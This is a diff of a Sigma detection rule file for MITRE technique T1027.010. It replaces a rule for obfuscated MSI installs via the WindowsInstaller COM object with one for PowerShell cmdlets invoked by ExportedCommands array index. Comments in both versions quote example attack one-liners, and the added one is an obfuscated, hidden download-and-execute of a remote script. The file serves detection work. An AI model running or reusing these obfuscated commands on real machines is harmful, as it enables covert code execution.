@@ -1,11 +1,11 @@
-title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
-id: 2cad92f9-2cad-4cad-acad-2cad92f90000
+title: PowerShell Dynamic Module Invocation Via ExportedCommands Array Index
+id: 26c71994-26c7-46c7-a6c7-26c719940000
 status: stable
 description: Detection rule for MITRE ATT&CK technique T1027.010
 references:
-  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_cmdlet_invocation_via_exported_commands_array_index.yml
 author: sigma (via IncidentBuddy)
-date: 2026-10-04
+date: 2026-10-11
 tags:
   - attack.t1027.010
 logsource:
@@ -14,22 +14,25 @@ logsource:
 detection:
   selection:
     # Original sigma detection logic
-    #     # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
+    #     # powershell.exe -NoP -W Hidden -C "$kp=12;$sEzg=32;$cSX=((Get-Module -ListAvailable 'Microsoft.PowerShell.Utility')).ExportedCommands.Values;$cSX=$cSX.Name;& $cSX[$kp] 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -OutFile C:\Temp\maldoc.ps1;$qJgm=$cSX[$sEzg];& $qJgm (Get-Content C:\Temp\maldoc.ps1 -Raw)"
     #     selection_img:
     #         - Image|endswith:
-    #               - '\powershell_ise.exe'
     #               - '\powershell.exe'
     #               - '\pwsh.exe'
     #         - OriginalFileName:
-    #               - 'PowerShell_ISE.EXE'
-    #               - 'PowerShell.EXE'
+    #               - 'powershell.exe'
     #               - 'pwsh.dll'
-    #     selection_cli:
+    #     selection_module_export_enum:
+    #         CommandLine|contains:
+    #             - 'Get-Module '
+    #             - 'gmo '
     #         CommandLine|contains|all:
-    #             - '-ComObject'
-    #             - 'InstallProduct('
-    #             - '.Insert('
-    #             - 'UILevel'
+    #             - 'ListAvailable'
+    #             - 'Microsoft.PowerShell.Utility'
+    #             - 'ExportedCommands'
+    #             - 'Values'
+    #     selection_index_used:
+    #         CommandLine|contains: '[*]'
     #     condition: all of selection_*
     # 
   condition: selection
